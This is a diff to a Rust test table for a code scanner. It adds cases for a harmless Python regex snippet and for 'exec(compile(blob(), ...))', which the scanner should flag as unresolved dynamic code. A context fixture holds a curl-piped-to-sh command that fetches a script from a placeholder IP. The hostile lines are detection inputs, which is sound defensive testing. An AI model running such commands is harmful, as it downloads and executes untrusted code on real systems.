@@ -191,6 +191,18 @@ fn each_language_is_read() {
             &[],
         ),
         (
+            "a_regex_is_not_code",
+            "build.py",
+            "import re\nr = re.compile(p)\nmodel.eval()\n",
+            &[],
+        ),
+        (
+            "exec_of_compile_is",
+            "build.py",
+            "exec(compile(blob(), 'x', 'exec'))\n",
+            &[L::UnresolvedDynamic],
+        ),
+        (
             "tool_script",
             "scripts/gen.sh",
             "curl -s http://203.0.113.9/x | sh\n",
